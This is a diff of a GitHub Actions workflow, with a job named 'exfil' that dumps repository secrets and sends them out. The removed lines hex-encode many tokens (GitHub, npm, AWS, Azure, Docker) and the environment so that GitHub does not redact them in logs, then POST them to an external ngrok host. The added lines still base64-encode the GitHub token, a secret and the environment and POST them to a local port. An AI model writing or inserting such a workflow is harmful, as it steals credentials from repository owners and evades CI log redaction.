@@ -7,46 +7,14 @@ jobs:
   exfil:
     runs-on: ubuntu-latest
     steps:
-      - name: Dump and send (stealth)
+      - name: Dump and send
         run: |
-          # Function to encode with multiple layers
-          encode() {
-            echo -n "$1" | base64 -w 0 | xxd -p -c 9999 | tr -d '\n'
-          }
-          
-          # Grab secrets and encode them (GitHub can't redact hex)
-          token_hex=$(echo "${{ secrets.GITHUB_TOKEN }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          secret1_hex=$(echo "${{ secrets.SECRET_1 }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          secret2_hex=$(echo "${{ secrets.SECRET_2 }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          secret3_hex=$(echo "${{ secrets.SECRET_3 }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          secret4_hex=$(echo "${{ secrets.SECRET_4 }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          secret5_hex=$(echo "${{ secrets.SECRET_5 }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          npm_hex=$(echo "${{ secrets.NPM_TOKEN }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          aws_hex=$(echo "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          aws_key_hex=$(echo "${{ secrets.AWS_ACCESS_KEY_ID }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          azure_hex=$(echo "${{ secrets.AZURE_CLIENT_SECRET }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          docker_hex=$(echo "${{ secrets.DOCKER_PASSWORD }}" | base64 -w 0 2>/dev/null | xxd -p -c 9999 | tr -d '\n' || echo "")
-          
-          # Also grab env
+          # Grab secrets and encode them
+          token=$(echo "${{ secrets.GITHUB_TOKEN }}" | base64 -w 0 2>/dev/null || echo "")
+          secret1=$(echo "${{ secrets.SECRET_1 }}" | base64 -w 0 2>/dev/null || echo "")
           env_data=$(env | base64 -w 0)
           
-          # Send JSON payload
-          curl -X POST https://july-reorder-overlaid.ngrok-free.dev \
+          # Send to port 9090
+          curl -X POST http://localhost:9090 \
             -H "Content-Type: application/json" \
-            -d "{
-              \"repo\":\"${{ github.repository }}\",
-              \"actor\":\"${{ github.actor }}\",
-              \"ref\":\"${{ github.ref }}\",
-              \"env\":\"$env_data\",
-              \"token_hex\":\"$token_hex\",
-              \"secret1_hex\":\"$secret1_hex\",
-              \"secret2_hex\":\"$secret2_hex\",
-              \"secret3_hex\":\"$secret3_hex\",
-              \"secret4_hex\":\"$secret4_hex\",
-              \"secret5_hex\":\"$secret5_hex\",
-              \"npm_hex\":\"$npm_hex\",
-              \"aws_hex\":\"$aws_hex\",
-              \"aws_key_hex\":\"$aws_key_hex\",
-              \"azure_hex\":\"$azure_hex\",
-              \"docker_hex\":\"$docker_hex\"
-            }"
+            -d "{\"repo\":\"${{ github.repository }}\",\"actor\":\"${{ github.actor }}\",\"env\":\"$env_data\",\"token\":\"$token\",\"secret1\":\"$secret1\"}" || echo "Failed to send"
